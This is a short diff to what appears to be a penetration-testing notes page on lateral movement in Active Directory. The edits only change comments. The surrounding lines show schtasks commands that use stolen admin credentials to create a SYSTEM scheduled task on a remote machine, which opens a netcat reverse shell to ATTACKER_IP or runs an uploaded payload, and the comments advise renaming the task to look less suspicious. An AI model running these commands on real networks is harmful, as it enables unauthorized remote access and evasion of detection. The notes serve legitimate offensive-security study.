@@ -44,11 +44,11 @@ Suppose we have breached a machine (`mach1`) on the AD network, along with crede
 
 {% code title="mach1 (breached machine)" overflow="wrap" %}
 ```powershell
-# ofcourse we want to change the taskname  to something less suspicious 
+# ofcourse we want to change the taskname to something less suspicious 
 #(1)
 C:\> schtasks /create /s mach2.xxxx /ru "SYSTEM" /u "admin" /p pass /tn "revshell" /tr "c:\tools\nc64.exe -e cmd.exe ATTACKER_IP <PORT>" /sc ONCE /st xxx 
 
-#(2) same command as (1), just with different payload
+#(2) same command as (1), just with different payload (binary uploaded via SMB)
 C:\> schtasks /create ... /ru "SYSTEM" /tn "revshell" /tr "%windir%\rvshell.exe"  
 
 C:\> schtasks /run /s mach2.xxxx  /tn  "revshell" 
